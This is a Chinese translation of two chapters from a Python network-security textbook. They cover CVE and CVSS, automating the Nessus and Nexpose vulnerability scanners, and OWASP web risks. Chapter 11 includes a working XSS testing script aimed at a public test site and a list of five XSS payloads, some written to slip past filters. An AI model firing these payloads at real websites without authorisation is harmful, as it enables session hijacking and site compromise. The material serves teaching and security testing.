# 精通 Python 网络安全（四）

> 原文：[`zh.annas-archive.org/md5/2fd2c4f6d02f5009e067781f7b1aee0c`](https://zh.annas-archive.org/md5/2fd2c4f6d02f5009e067781f7b1aee0c)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十章：与漏洞扫描器交互

本章涵盖了`nessus`和`nexpose`作为漏洞扫描器，并为在服务器和 Web 应用程序中发现的主要漏洞提供报告工具。此外，我们还介绍了如何使用 Python 中的`nessrest`和`Pynexpose`模块进行编程。

本章将涵盖以下主题：

+   理解漏洞

+   理解`nessus`漏洞扫描器

+   理解允许我们连接到`Nessus`服务器的`nessrest`模块

+   理解`nexpose`漏洞扫描器

+   理解允许我们连接到`Nexpose`服务器的`Pynexpose`模块

# 技术要求

本章的示例和源代码可在 GitHub 存储库的`chapter 10`文件夹中找到：[`github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security`](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)。

您需要在本地机器上安装一个至少有 4GB 内存的 Python 发行版。在本章中，我们将使用一个**虚拟机**，进行与端口分析和漏洞检测相关的一些测试。可以从 sourceforge 页面下载：[`sourceforge.net/projects/metasploitable/files/Metasploitable2`](https://sourceforge.net/projects/metasploitable/files/Metasploitable2)。

要登录，您必须使用**msfadmin**作为用户名和**msfadmin**作为密码。

# 介绍漏洞

在这一部分，我们回顾了与漏洞和利用相关的概念，详细介绍了我们可以找到漏洞的格式。

# 漏洞和利用

在这一部分，我们介绍了关于漏洞和利用的一些定义。

# 什么是漏洞？

漏洞是我们应用程序中的代码错误或配置错误，攻击者可以利用它来改变应用程序的行为，比如注入代码或访问私人数据。

漏洞也可以是系统安全性的弱点，可以被利用来获取对其的访问权限。这些可以通过两种方式进行利用：远程和本地。远程攻击是从被攻击的机器不同的机器上进行的攻击，而本地攻击是在被攻击的机器上进行的攻击。后者基于一系列技术来获取对该机器的访问权限和提升权限。

# 什么是利用？

随着软件和硬件行业的发展，市场上推出的产品出现了不同的漏洞，这些漏洞已被攻击者发现并利用来危害使用这些产品的系统的安全性。为此，已经开发了利用，它们是一种软件片段、数据片段或脚本，利用错误、故障或弱点，以引起系统或应用程序中的不良行为，能够强制改变其执行流程，并有可能随意控制。

有一些漏洞只有少数人知道，称为零日漏洞，可以通过一些利用来利用，也只有少数人知道。这种利用被称为零日利用，是一种尚未公开的利用。通过这些利用进行攻击只要存在暴露窗口；也就是说，自从发现弱点直到提供者补救的时刻。在此期间，那些不知道存在这个问题的人可能容易受到使用这种利用发动的攻击。

# 漏洞格式

漏洞是通过 CVE（通用漏洞和暴露）代码唯一标识的，该代码由 MITRE 公司创建。这个代码允许用户以更客观的方式理解程序或系统中的漏洞。

标识符代码的格式为 CVE - 年份 - 编号模式；例如 CVE-2018-7889 标识了 2018 年发现的漏洞，标识符为 7889。有几个数据库可以找到有关不同现有漏洞的信息，例如：

+   通用漏洞和暴露 - 信息安全漏洞名称的标准：[`cve.mitre.org/cve/`](https://cve.mitre.org/cve/)

+   国家漏洞数据库（NVD）：[`nvd.nist.gov`](http://nvd.nist.gov)

通常，发布的漏洞都会分配其相应的利用，以验证潜在漏洞的真实存在并衡量其影响。有一个名为 Exploit Database（[`www.exploit-db.com`](http://www.exploit-db.com)）的存储库，您可以在其中找到为不同漏洞开发的许多利用程序。

CVE 提供了一个非常有用的漏洞数据库，因为除了分析问题漏洞外，它还提供了大量参考资料，其中我们经常找到直接链接到攻击此漏洞的利用程序。

例如，如果我们搜索“心脏出血”（在 Open SSL 版本 1.0.1 中发现的漏洞，允许攻击者从服务器和客户端读取内存），在 CVE 中为我们提供以下信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/3d089e98-a3fb-45a0-a10e-699afb5c8cfd.png)

在此屏幕截图中，我们可以看到 CVE-2014-0160 漏洞的详细信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/fc1ff3d2-e952-4011-b747-b481e9b89649.png)

**CVSS**（通用漏洞评分系统）代码也可用，这是由**FIRST**（国际响应团队论坛 - [`www.first.org`](http://www.first.org)）赞助的公共倡议，使我们能够解决缺乏标准标准的问题，这些标准标准使我们能够确定哪些漏洞更有可能被成功利用。CVSS 代码引入了一个评分漏洞的系统，考虑了一组标准化和易于测量的标准。

扫描报告中的漏洞分配了高，中或低的严重性。严重性基于分配给 CVE 的通用漏洞评分系统（CVSS）分数。大多数漏洞扫描程序使用供应商的分数以准确捕获严重性：

+   **高：**漏洞具有 CVSS 基础分数，范围从 8.0 到 10.0。

+   **中：**漏洞具有 CVSS 基础分数，范围从 4.0 到 7.9。

+   **低：**漏洞具有 CVSS 基础分数，范围从 0.0 到 3.9。

# 介绍 Nessus 漏洞扫描器

在本节中，我们将审查`Nessus`漏洞扫描器，它为我们在服务器和 Web 应用程序中发现的主要漏洞提供了报告工具。

# 安装 Nessus 漏洞扫描器

`Nessus` 是一款流行的漏洞扫描工具 - 它非常强大，适用于大型企业网络。它具有客户端-服务器架构，可以使扫描更具可扩展性，可管理性和精确性。此外，它采用了几个安全元素，可以轻松适应安全基础设施，并具有非常强大的加密和身份验证机制。

要安装它，请转到[`www.tenable.com/downloads/nessus`](https://www.tenable.com/downloads/nessus)并按照操作系统的说明进行操作：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/48eebb10-53ae-4fc2-a5f5-961c36f24f7c.png)

此外，您还需要从[`www.tenable.com/products/nessus/activation-code`](https://www.tenable.com/products/nessus/activation-code)获取激活代码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/551cb6bb-66a0-4866-b832-aaed11ac6e1e.png)

# 执行 Nessus 漏洞扫描器

安装后，如果您在 Linux 上运行，可以执行"`/etc/init.d/nessusd start`"命令；通过浏览器访问该工具，网址为[`127.0.0.1:8834`](https://127.0.0.1:8834)，然后输入在安装过程中激活的用户帐户。

进入`Nessus`的主界面后，您必须输入用户的访问数据。然后，您必须访问**扫描选项卡**，如图中所示，并选择**基本网络扫描**选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/8e46b41c-53a1-4572-9e15-492d447e0452.png)

当进行此选择时，将打开界面，必须确定扫描仪的目标，无论是计算机还是网络，扫描仪的策略以及一个名称以便识别它。一旦选择了这些数据，扫描仪就会启动，一旦完成，我们可以通过选择扫描选项卡中的分析来查看结果。

在扫描选项卡中，添加要扫描的目标，并执行该过程。通过使用这个工具，再加上在专门数据库中的搜索，可以获得系统中存在的不同漏洞，这使我们能够进入下一个阶段：利用。

# 使用 Nessus 识别漏洞

这个工具补充了通过在专门的数据库中进行查询来识别漏洞的过程。这种自动扫描的缺点包括误报、未检测到一些漏洞，有时对一些允许访问系统的漏洞进行低优先级分类。

通过这个分析，您可以观察到不同的漏洞，这些漏洞可能会被任何用户利用，因为它们可以从互联网访问。

报告包括不同现有漏洞的执行摘要。这个摘要根据漏洞的严重程度进行了颜色编码排序。每个漏洞都附有其严重性、漏洞代码和简要描述。

将`Nessus`应用于 Metasploitable 环境后得到的结果如下图所示。

在这里，我们可以看到按照严重程度排序的所有发现的漏洞的摘要：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/59906823-523d-439a-9e96-e27a48defbe8.png)

在这里，我们可以详细查看所有漏洞，以及严重程度的描述：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/25969e69-0780-4154-879f-cd46b74d4236.png)

名为 Debian OpenSSh/OpenSSL Package Random Number Generator Weakness 的漏洞是 metasplolitable 虚拟机中最严重的之一。我们可以看到它在 CVSS 中得分为 10：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/481c7fdb-83a8-4cb3-8c31-9aa236118818.png)

# 使用 Python 访问 Nessus API

在这一部分，我们审查与`Nessus`漏洞扫描器进行交互的`python`模块。

# 安装 nessrest Python 模块

`Nessus`提供了一个 API，可以通过 Python 编程访问它。Tenable 提供了一个 REST API，我们可以使用任何允许 HTTP 请求的库。我们还可以在 Python 中使用特定的库，比如`nessrest`：[`github.com/tenable/nessrest`](https://github.com/tenable/nessrest)。

要在我们的 Python 脚本中使用这个模块，我们可以像安装其他模块一样导入它。我们可以使用 pip 安装`nessrest`模块：

```py
$ pip install nessrest
```

如果我们尝试从 github 源代码构建项目，依赖项可以通过满足

`pip install -r requirements.txt`**：**

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/24c12ea5-00f8-4df1-84a2-a81d43f83012.png)

您可以在脚本中以这种方式导入模块：

```py
from nessrest import ness6rest
```

# 与 nessus 服务器交互

要从 Python 与`nessus`进行交互，我们必须使用`ness6rest.Scanner`类初始化扫描仪，并传递 url 参数、用户名和密码以访问`nessus`服务器实例：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/e6383286-6e66-4763-8e98-f131e32a1598.png)我们可以使用 Scanner init 构造方法来初始化与服务器的连接：

```py
scanner = ness6rest.Scanner(url="https://server:8834", login="username", password="password")
```

默认情况下，我们正在使用具有自签名证书的`Nessus`，但我们有能力禁用 SSL 证书检查。为此，我们需要向扫描程序初始化器传递另一个参数`insecure=True`：

```py
scanner = ness6rest.Scanner(url="https://server:8834", login="username", password="password",insecure=True)
```

在模块文档中，我们可以看到扫描特定目标的方法，并且使用`scan_results()`我们可以获取扫描结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/c223199b-3b55-4819-a9a7-6abfff3d7261.png)

要添加和启动扫描，请使用`scan_add`方法指定目标：

```py
scan.scan_add(targets="192.168.100.2")
scan.scan_run()
```

# 介绍 Nexpose 漏洞扫描仪

在本节中，我们将审查`Nexpose`漏洞扫描仪，它为我们在服务器和 Web 应用程序中发现的主要漏洞提供报告工具。

# 安装 Nexpose 漏洞扫描仪

`Nexpose`是一个漏洞扫描仪，其方法类似于`nessus`，因为除了允许我们对网络上的多台机器运行扫描外，它还具有插件系统和 API，允许将外部代码例程与引擎集成。

`NeXpose`是由`Rapid7`开发的用于扫描和发现漏洞的工具。有一个社区版本可用于非商业用途，尽管它有一些限制，但我们可以用它来进行一些测试。

要安装软件，您必须从官方页面获取有效许可证：

[`www.rapid7.com/products/nexpose/download/`](https://www.rapid7.com/products/nexpose/download/)

一旦我们通过官方页面安装了`nexpose`，我们就可以访问服务器运行的 URL。

运行`nscsvc.bat`脚本，我们将在 localhost 3780 上运行服务器：

[`localhost:3780/login.jsp`](https://localhost:3780/login.jsp)

在 Windows 机器上的默认安装在`C:\ProgramFiles\rapid7\nexpose\nsc`中

路径。

# 执行 Nexpose 漏洞扫描仪

`Nexpose`允许您分析特定的 IP、域名或服务器。首先，需要创建一组资源，称为资产，它定义了引擎可审计的所有元素。

为此，还有一系列资源，也称为**资产**，在资产内部，我们定义要分析的站点或域：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/5c2f897a-3302-4ec2-9001-f2f2037db366.png)

在我们的案例中，我们将分析具有 IP 地址 192.168.56.101 的**metasploitable 虚拟机**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/7372ea22-8e32-4e1f-95cb-f2fea3cbe6d5.png)

在分析结束时，我们可以看到扫描结果和检测到的漏洞：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/ea956670-b26e-4344-917a-d094c841da5f.png)

`Nexpose`具有一个**API**，允许我们从其他应用程序访问其功能；这样，它允许用户从管理界面自动执行任务。

API 文档可作为 PDF 在以下链接找到：[`download2.rapid7.com/download/NeXposev4/Nexpose_API_Guide.pdf`](http://download2.rapid7.com/download/NeXposev4/Nexpose_API_Guide.pdf)。

可用的功能以及其使用的详细信息可以在指南中找到。在 Python 中，有一些库可以以相当简单的方式与 HTTP 服务进行交互。为了简化事情，可以使用一个脚本，该脚本已负责查询`nexpose`实例中可用的功能，并以 XML 格式返回包含有关漏洞的所有信息的字符串。

# 使用 Python 访问 Nexpose API

在本节中，我们将审查与`Nexpose`漏洞扫描仪进行交互的`pynexpose`模块。

# 安装`pynexpose` Python 模块

`Nexpose`有一个 API，允许我们从外部应用程序访问其功能，从而使用户能够从管理界面或`nexpose`控制台执行任务的自动化。API 允许任何例行代码使用 HTTPS 调用与`nexpose`实例交互，以返回 XML 格式的函数。使用 HTTPS 协议非常重要，不仅是出于安全原因，还因为 API 不支持使用 HTTP 进行调用。

在 Python 中，我们有`Pynexpose`模块，其代码可以在[`code.google.com/archive/p/pynexpose/`](https://code.google.com/archive/p/pynexpose/)找到。

`Pynexpose`模块允许从 Python 对位于 Web 服务器上的漏洞扫描程序进行编程访问。为此，我们必须通过 HTTP 请求与该服务器通信。

要从 Python 连接到`nexpose`服务器，我们使用位于**pynexposeHttps.py**文件中的`NeXposeServer`类。为此，我们调用构造函数，通过参数传递服务器的 IP 地址、端口以及我们登录到服务器管理网页的用户和密码：

```py
serveraddr_nexpose = "192.168.56.101"
port_server_nexpose = "3780"
user_nexpose = "user"
password_nexpose = "password"
pynexposeHttps = pynexposeHttps.NeXposeServer(serveraddr_nexpose, port_server_nexpose, user_nexpose, password_nexpose)
```

我们可以创建一个**NexposeFrameWork**类，它将初始化与服务器的连接，并创建一些方法来获取检测到的站点和漏洞列表。要解析**XML**格式的漏洞数据，我们需要使用**BeautifulSoup**等**解析器**。

在`siteListing()`函数中，我们解析了执行`site_listing()`函数后返回的内容，随后定位到文档中的所有**"sitesummary"**元素，这些元素对应于服务器上创建的每个站点的信息。

同样，在**`vulnerabilityListing()`**函数中，我们解析了执行`vulnerability_listing()`函数后返回的内容，一旦定位到文档中的所有“vulnerabilitysummary”元素。

您可以在`nexpose`文件夹中的**NexposeFrameWork.py**文件中找到以下代码：

```py
from bs4 import BeautifulSoup

class NexposeFrameWork:

    def __init__(self, pynexposeHttps):
        self.pynexposeHttps = pynexposeHttps

 def siteListing(self):
        print "\nSites"
        print "--------------------------"
        bsoupSiteListing = BeautifulSoup(self.pynexposeHttps.site_listing(),'lxml')
        for site in bsoupSiteListing.findAll('sitesummary'):
            attrs = dict(site.attrs)
                print("Description: " + attrs['description'])
                print("riskscore: " + attrs['riskscore'])
                print("Id: " + attrs['id'])
                print("riskfactor: " + attrs['riskfactor'])
                print("name: " + attrs['name'])
                print("\n")

```

在这段代码中，我们可以看到获取漏洞列表的方法；对于每个漏洞，它显示与标识符、严重性、标题和描述相关的信息：

```py
 def vulnerabilityListing(self):
        print("\nVulnerabilities")
        print("--------------------------")
        bsoupVulnerabilityListing =        BeautifulSoup(self.pynexposeHttps.vulnerability_listing(),'lxml')
         for vulnerability in bsoupVulnerabilityListing.findAll('vulnerabilitysummary'):
            attrs = dict(vulnerability.attrs)
            print("Id: " + attrs['id'])
            print("Severity: " + attrs['severity'])
            print("Title: " + attrs['title'])
            bsoupVulnerabilityDetails = BeautifulSoup(self.pynexposeHttps.vulnerability_details(attrs['id']),'lxml')
            for vulnerability_description in bsoupVulnerabilityDetails.findAll('description'):
                print("Description: " + vulnerability_description.text)
                print("\n")
```

在这段代码中，我们可以看到我们的主程序，我们正在初始化与 IP 地址、端口、用户和密码相关的参数，以连接到`nexpose`服务器：

```py
if __name__ == "__main__":
    serveraddr_nexpose = "192.168.56.101"
    port_server_nexpose = "3780"
    user_nexpose = "user"
    password_nexpose = "password"
    pynexposeHttps = pynexposeHttps.NeXposeServer(serveraddr_nexpose,port_server_nexpose, user_nexpose, password_nexpose)

    nexposeFrameWork = NexposeFrameWork(pynexposeHttps)
    nexposeFrameWork.siteListing()
    nexposeFrameWork.vulnerabilityListing()
```

一旦创建了与`nexpose`服务器的连接的对象，我们可以使用一些函数来列出服务器上创建的站点，并列出从 Web 界面执行的分析和生成的报告。最后，`logout`函数允许我们断开与服务器的连接并销毁已创建的会话：

```py
nexposeFrameWork = NexposeFrameWork(pynexposeHttps)
nexposeFrameWork.siteListing()
nexposeFrameWork.vulnerabilityListing()
pynexposeHttps.logout()
```

**NexposeFrameWork**类中创建的函数使用`pynexpose`脚本中的以下方法。`vulnerability_listing()`和`vulnerability_details()`方法负责列出所有检测到的漏洞并返回特定漏洞的详细信息：

```py
pynexposeHttps.site_listing()
pynexposeHttps.vulnerability_listing()
pynexposeHttps.vulnerability_details()
```

这些方法在**pynexposeHttps.py**文件中的**NeXposeServer**类中定义。

```py
def site_listing(self):
    response = self.call("SiteListing")
    return etree.tostring(response)

def vulnerability_listing(self):
    response = self.call("VulnerabilityListing")
    return etree.tostring(response)

def vulnerability_details(self, vulnid):
    response = self.call("VulnerabilityDetails", {"vuln-id" : vulnid})
    return etree.tostring(response)
```

需要记住的一件事是，返回的回复是以 XML 格式。解析和获取信息的一种简单方法是使用`BeautifulSoup`模块以及`lxml`解析器。

通过这种方式，我们可以解析返回的内容，并查找与站点和已注册漏洞相对应的标签。

`Nexpose`用于收集新数据，发现新的漏洞，并且通过实时监控，可以快速解决可能出现在网络或应用程序级别的漏洞。通过使用这个工具，您还可以将数据转换为详细的可视化，以便您可以集中资源并轻松与组织中的其他 IT 部门共享每个操作。

在这张图片中，我们可以看到在 metasploitble 虚拟机上执行**NexposeFrameWork.py**的结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/72f93933-ef40-4ec3-8050-3e57ae59311e.png)

此扫描的结果可以在附加的`nexpose_log.txt`文件中找到。

这些类型的工具能够定期执行漏洞扫描，并将使用不同工具发现的内容与先前的结果进行比较。这样，我们将突出显示变化，以检查它们是否是真正的发现。直到它们改变状态，可能的安全问题都不会被忽视，这对于大大减少漏洞分析的时间是理想的。

# 总结

本章的一个目标是了解允许我们连接到漏洞扫描器（如`nessus`和`nexpose`）的模块。我们复习了一些关于漏洞和利用的定义。在获得了服务、端口和操作系统等元素之后，必须在互联网上的不同数据库中搜索它们的漏洞。然而，也有几种工具可以自动执行漏洞扫描，如`Nessus`和`Nexpose`。

在下一章中，我们将使用诸如`w3a`和`fsqlmap`之类的工具来探索识别 Web 应用程序中的服务器漏洞，以及其他用于识别服务器漏洞的工具，如 ssl 和 heartbleed。

# 问题

1.  在考虑一组标准化和易于衡量的标准的情况下，评分漏洞的主要机制是什么？

1.  我们使用哪个软件包和类来与`nessus`从 python 交互？

1.  `nessrest`模块中的哪种方法启动了指定目标的扫描？

1.  `nessrest`模块中的哪种方法获取了指定目标扫描的详细信息？

1.  用 Python 连接到`nexpose`服务器的主要类是什么？

1.  负责列出所有检测到的漏洞并返回`nexpose`服务器中特定漏洞的详细信息的方法是什么？

1.  允许我们解析并获取从`nexpose`服务器获取的信息的`Python`模块的名称是什么？

1.  允许我们连接到`NexPose`漏洞扫描器的`Python`模块的名称是什么？

1.  什么是允许我们连接到`Nessus`漏洞扫描器的`Python`模块的名称？

1.  `Nexpose`服务器以何种格式返回响应，以便从 Python 中简单地处理？

# 进一步阅读

在这些链接中，您将找到有关`nessus`和`nexpose`的更多信息和官方文档：

+   [`docs.tenable.com/nessus/Content/GettingStarted.htm`](https://docs.tenable.com/nessus/Content/GettingStarted.htm)

+   [`nexpose.help.rapid7.com/docs/getting-started-with-nexpose`](https://nexpose.help.rapid7.com/docs/getting-started-with-nexpose)

+   [`help.rapid7.com/insightvm/en-us/api/index.html`](https://help.rapid7.com/insightvm/en-us/api/index.html)

今天，有很多漏洞扫描工具。Nessus、Seccubus、openvas、著名的 Nmap 扫描器，甚至 OWASP ZAP 都是扫描网络和计算机系统漏洞最流行的工具之一：

+   [`www.seccubus.com/`](https://www.seccubus.com/)

+   [`www.openvas.org/`](http://www.openvas.org/)

开放漏洞评估系统（OpenVAS）是一个免费的安全扫描平台，其大部分组件都在 GNU 通用公共许可证（GNU GPL）下许可。主要组件可通过几个 Linux 软件包或作为可下载的虚拟应用程序用于测试/评估目的。


# 第十一章：识别 Web 应用程序中的服务器漏洞

本章涵盖了 Web 应用程序中的主要漏洞以及我们可以在 Python 生态系统中找到的工具，例如 w3af 作为 Web 应用程序中的漏洞扫描器，以及用于检测 SQL 漏洞的 sqlmap。关于服务器漏洞，我们将介绍如何测试启用了 openssl 的服务器中的心脏出血和 SSL 漏洞。

本章将涵盖以下主题：

+   OWASP 中的 Web 应用程序漏洞

+   w3af 作为 Web 应用程序中的漏洞扫描器

+   如何使用 Python 工具发现 SQL 漏洞

+   用于测试心脏出血和 SSL/TLS 漏洞的 Python 脚本

# 技术要求

本章的示例和源代码可在 GitHub 存储库的`chapter11`文件夹中找到：

[`github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security`](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)

您需要在本地机器上安装至少 4GB 内存的 Python 发行版。

脚本可以在 Python 2.7 和 3.x 版本中执行，w3af 在 Unix 发行版（如 Ubuntu）中进行了测试。

# 介绍 OWASP 中的 Web 应用程序漏洞

开放式 Web 应用程序安全项目（OWASP）十大是关键的网络应用程序安全风险的列表。在本节中，我们将评论 OWASP 十大漏洞，并详细解释跨站脚本（XSS）漏洞。

# 介绍 OWASP

开放式 Web 应用程序安全项目是了解如何保护您的 Web 应用程序免受不良行为的绝佳资源。有许多种应用程序安全漏洞。OWASP 在 OWASP 十大项目中排名前十的应用程序安全风险：[`www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project`](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project)。

完整的分类可以在 GitHub 存储库中的章节文件夹中的共享`OWASP.xlsx` Excel 文件中找到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/2b915aec-e598-4ea1-8cd6-f7761421bff4.png)

在这里，我们可以突出以下代码：

+   **OTG-INFO-001 信息泄漏：**我们可以利用 Bing、Google 和 Shodan 等搜索引擎，使用这些搜索引擎提供的操作符或 dorks 来搜索信息泄漏。例如，我们可以查看 Shodan 给我们的信息，我们可以进行 IP 或域的搜索，并使用 Shodan 的服务来查看它公开和开放的端口。

+   **OTG-INFO-002 Web 服务器指纹识别：**我们将尝试找出我们目标网站所使用的服务器类型，为此我们使用 Kali Linux 发行版中可以找到的 whatweb 工具。

+   **OTG-INFO-003 在服务器文件中找到的元数据：**在这一点上，我们可以使用工具，如 Foca 或 Metagoofil，来提取网站上发布的文档中的元数据。

+   **OTG-INFO-004 枚举子域和服务器应用程序：**我们将使用工具来获取有关可能的子域、DNS 服务器、服务和服务器应用程序中打开的端口的信息。

+   **OTG-INFO-005 Web 的注释和元数据：**我们可以在网页的注释中找到程序员用于调试代码的泄漏信息。

+   **OTG-INFO-006 和 OTG-INFO-007 识别入口点和网站地图：**我们可以检测网页的所有入口点（使用`GET`和`POST`的请求和响应），为此我们将使用反向 Web 代理（ZAP、Burp 或 WebScarab），并使用其 Spider 生成网页的完整地图及其入口点。

+   OTG-INFO-008 指纹识别 Web 应用程序框架：这是为了找出开发 Web 所使用的框架类型，例如编程语言和技术。我们可以在 HTTP 头、cookie、HTML 代码和不同的文件和文件夹中找到所有这些信息。当我们使用 whatweb 工具时，我们可以看到 JQuery 正在使用 CMS 使用的其他特定技术。

+   OTG-INFO-009 指纹识别 Web 应用程序：这是为了找出是否使用了某种 CMS 来开发 Web：WordPress、Joomla 或其他类型的 CMS。

+   OTG-INFO-0010 服务器架构：我们可以检查通信中是否有任何防火墙。对于这个任务，我们可以进行某种类型的端口扫描，看看是否没有 Web 应用程序防火墙，例如，由于端口 80 未经过滤。

# OWASP 常见攻击

让我们来看一些最常见的攻击：

+   SQL 注入：当用户提供的数据未经过滤地发送到查询的解释器作为查询的一部分以修改原始行为，执行命令或在数据库中执行任意查询时，就会发生 SQL 代码的注入。攻击者在请求中发送原始的 SQL 语句。如果您的服务器使用请求内容构建 SQL 查询，可能会执行攻击者在数据库上的请求。但是，在 Python 中，如果您使用 SQLAlchemy 并完全避免原始的 SQL 语句，您将是安全的。如果使用原始的 SQL，请确保每个变量都正确引用。我们可以在[`www.owasp.org/index.php/SQL_Injection`](https://www.owasp.org/index.php/SQL_Injection)找到更多关于这种类型注入的信息和 owasp 文档。

+   跨站脚本（XSS）：这种攻击只发生在显示一些 HTML 的网页上。攻击者使用一些查询属性来尝试在页面上注入他们的一段`javascript`代码，以欺骗用户执行一些动作，认为他们在合法的网站上。XSS 允许攻击者在受害者的浏览器中执行脚本，从而劫持用户会话，破坏网站，或将用户重定向到恶意网站（[`www.owasp.org/index.php/XSS`](https://www.owasp.org/index.php/XSS)）。

+   跨站请求伪造（XSRF/CSRF）：这种攻击是基于通过重用用户在另一个网站上的凭据来攻击服务。典型的 CSRF 攻击发生在 POST 请求中。例如，恶意网站向用户显示一个链接，以欺骗用户使用其现有凭据在您的网站上执行 POST 请求。CSRF 攻击迫使经过身份验证的受害者的浏览器发送伪造的 HTTP 请求，包括用户的会话 cookie 和任何其他自动包含的身份验证信息，到一个易受攻击的 Web 应用程序。这允许攻击者强制受害者的浏览器生成易受攻击应用程序解释为合法的请求（[`www.owasp.org/index.php/CSRF`](https://www.owasp.org/index.php/CSRF)）。

+   敏感数据泄露：许多 Web 应用程序未能充分保护敏感数据，如信用卡号或身份验证凭据。攻击者可以窃取或修改这些数据以进行欺诈、身份盗用或其他犯罪行为。敏感数据需要额外的保护方法，如数据加密，以及在与浏览器交换数据时的特殊预防措施（[`www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure`](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure)）。

+   未经验证的重定向和转发：Web 应用程序经常将用户重定向和转发到其他页面或网站，并使用不受信任的数据来确定着陆页面。如果没有适当的验证，攻击者可以将受害者重定向到钓鱼或恶意软件网站，或者使用转发访问未经授权的页面。

+   **命令注入攻击。** 命令注入是指在使用 popen、subprocess、os.system 调用进程并从变量中获取参数时。在调用本地命令时，有可能有人将这些值设置为恶意内容([`docs.python.org/3/library/shlex.html#shlex.quote`](https://docs.python.org/3/library/shlex.html#shlex.quote))。

有关 python 和 Django 应用程序中 XSS 和 CSRF 漏洞的更多信息，请参阅[`docs.djangoproject.com/en/2.1/topics/security/`](https://docs.djangoproject.com/en/2.1/topics/security/)。

# 测试跨站脚本（XSS）

跨站脚本是一种注入攻击类型，当攻击向量以浏览器端脚本的形式注入时发生。

要测试网站是否容易受到 XSS 攻击，我们可以使用以下脚本，从一个包含所有可能攻击向量的`XSS-attack-vectors.txt`文件中读取。如果由于向网站发出请求以及有效负载一起分析的结果，我们获得的信息与用户发送的信息相同，并再次显示给用户，那么我们就有一个明显的漏洞案例。

您可以在 XXS 文件夹的`URL_xss.py`文件中找到以下代码：

```py
import requests
import sys
from bs4 import BeautifulSoup, SoupStrainer
url = 'http://testphp.vulnweb.com/search.php?test=query'
data ={}

response = requests.get(url)
with open('XSS-attack-vectors.txt') as file:
    for payload in file:
        for field in BeautifulSoup(response.text, "html.parser",parse_only=SoupStrainer('input')):
            print(field)
            if field.has_attr('name'):
                if field['name'].lower() == "submit":
                    data[field['name']] = "submit"
                else:
                    data[field['name']] = payload

        response = requests.post(url, data=data)
        if payload in response.text:
            print("Payload "+ payload +" returned")
        data ={}
```

您可以在 XXS 文件夹的`XSS-attack-vectors.txt`文件中找到以下代码：

```py
<SCRIPT>alert('XSS');</SCRIPT>
<script>alert('XSS');</script>
<BODY ONLOAD=alert('XSS')>
<scrscriptipt>alert('XSS');</scrscriptipt>
<SCR%00IPT>alert(\"XSS\")</SCR%00IPT>
```

在这个截图中，我们可以看到之前脚本`URL_xss.py`的执行情况：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/d22b7045-b6a2-427f-ab05-2595f5ed2bdd.png)

我们可以在[testphp.vulnweb.com](http://testphp.vulnweb.com)网站上检查这个漏洞：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/4f155b6d-6355-499a-81c3-e800dd3c1e6e.png)

如果我们在搜索字段中输入其中一个向量攻击，我们可以看到我们获得了执行我们在脚本标签之间注入的相同代码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/26962f04-15c8-48bd-9488-58a474d46494.png)

# W3af 扫描器对 web 应用程序的漏洞

W3af 是 web 应用程序攻击和审计框架的缩写，是一个开源漏洞扫描器，可用于审计 web 安全。

# W3af 概述

W3af 是一个用于 web 应用程序的安全审计工具，它分为几个模块，如`Attack`、`Audit`、`Exploit`、`Discovery`、`Evasion`和`Brute Force`。W3af 中的这些模块都带有几个次要模块，例如，如果我们需要在 web 应用程序中测试跨站脚本（XSS）漏洞，我们可以在`Audit`模块中选择 XSS 选项，假设需要执行某个审计。

W3af 的主要特点是其审计系统完全基于用 Python 编写的插件，因此它成功地创建了一个易于扩展的框架和一个用户社区，他们为可能发生的 web 安全故障编写新的插件。

检测和利用可用插件的漏洞包括：

+   CSRF

+   XPath 注入

+   缓冲区溢出

+   SQL 注入

+   XSS

+   LDAP 注入

+   远程文件包含

在这个截图中，我们可以看到 w3af 官方网站和文档链接：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/4d29bcb2-5cab-45c8-ba3d-036cbb91b4a6.png)

我们有一组预配置的配置文件，例如 OWASP TOP 10，它执行全面的漏洞分析：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/60a25426-fe4c-417e-985e-f8afad4701a5.png)

